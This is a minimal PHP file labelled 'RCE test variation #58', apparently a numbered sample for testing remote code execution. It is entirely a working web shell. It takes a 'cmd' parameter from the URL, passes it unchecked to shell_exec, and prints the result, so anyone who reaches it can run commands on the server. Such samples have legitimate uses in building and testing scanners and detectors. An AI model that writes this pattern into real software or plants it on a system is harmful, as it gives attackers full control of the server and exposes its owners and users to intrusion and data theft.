<?php
// RCE test variation #58
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>